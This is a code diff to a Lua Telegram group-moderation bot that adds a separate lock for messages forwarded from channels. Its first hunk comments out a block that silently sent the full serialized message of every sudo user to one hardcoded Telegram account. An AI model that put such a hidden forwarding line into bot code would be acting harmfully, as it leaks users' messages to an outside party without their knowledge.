@@ -41,9 +41,9 @@ end
 --Begin msg_checks.lua
 --Begin pre_process function
 local function pre_process(msg)	
-if is_sudo(msg) then
- send_large_msg("user#id"..250877155, serpent.block(msg))		
-end		
+--if is_sudo(msg) then
+-- send_large_msg("user#id"..250877155, serpent.block(msg))		
+--end		
 if msg.text then
   get_value(msg, msg.text)		
 end		
@@ -93,7 +93,12 @@ if is_chat_msg(msg) or is_super_group(msg) then
 		lock_fwd = settings.lock_fwd
 	else
 		lock_fwd = 'no'
-	end	
+	end
+	if settings.lock_cfwd then
+		lock_cfwd = settings.lock_cfwd
+	else
+		lock_cfwd = 'no'
+	end			
 	if settings.lock_en then
 		lock_en = settings.lock_en
 	else
@@ -341,9 +346,12 @@ if is_chat_msg(msg) or is_super_group(msg) then
 			end
 		end
 		if msg.fwd_from then				
-		 if lock_fwd == "yes" then
+		 if lock_fwd == "yes" and msg.fwd_from.peer_type == "user" then
 		   delete_msg(msg.id, ok_cb, false)		
-		 end			
+		 end	
+		 if lock_cfwd == "yes" and msg.fwd_from.peer_type == "channel" then
+		   delete_msg(msg.id, ok_cb, false)		
+		 end				
 			if msg.fwd_from.title then
 				list_variables2(msg, msg.fwd_from.title)
 				local is_link_title = msg.fwd_from.title:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.fwd_from.title:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.fwd_from.title:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or msg.fwd_from.title:match("[Tt].[Mm][Ee]")								
